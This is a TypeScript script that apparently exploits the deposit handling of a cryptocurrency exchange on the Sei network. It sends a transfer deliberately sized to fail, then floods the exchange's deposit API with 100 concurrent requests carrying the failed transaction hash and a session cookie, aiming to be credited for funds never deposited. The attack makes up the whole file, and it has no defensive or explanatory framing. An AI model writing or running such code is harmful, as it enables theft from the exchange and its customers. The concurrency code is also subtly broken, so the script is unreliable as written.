import axios from 'axios';

import { calculateFee } from '@cosmjs/stargate';

import { Provider } from './utils/provider';

const quik_smart_wallet_address = "sei1tjss3yn46szetffyqgrp5pckrj24f0yxpwt4tw"

const mnemonic = "your mnemonic here" //mnemonic for wallet address
const Cookie = "" //session cookie

async function main() {
    const provider = await Provider.Connect({
        rpc: "https://rpc-sei.whispernode.com/",
        gasPrice: "0.1usei",
        mnemonic
    })

    //absurd amount of native tokens. greather than your balance, to fail.
    const transferAmount = Number(20000 * 1e6)
    const amount = { amount: String(transferAmount), denom: 'usei' };

    const fee = calculateFee(Number("100000"), "0.1usei");

    const txn = await provider.client.sendTokens(provider.userAddress, quik_smart_wallet_address, [amount], fee)
    const txHash = txn.transactionHash

    //spam because the server is slow to recognize the deposit or idk what's the problem with it.
    function recognizeDeposit() {
        return new Promise((res) => {
            const url = "https://quik.exchange/api/deposit"

            const payload = { txHash }

            axios.post(url, payload, {
                headers: {
                    Cookie
                }
            })
                .then(() => { res(null) })
                .catch(() => { res(null) })
        })
    }

    const promises = []

    for (let i = 0; i < 100; i++) {
        promises.push(recognizeDeposit)
    }

    for (const promise of promises) {
        promise()
    }

    await Promise.allSettled(promises)
}

main()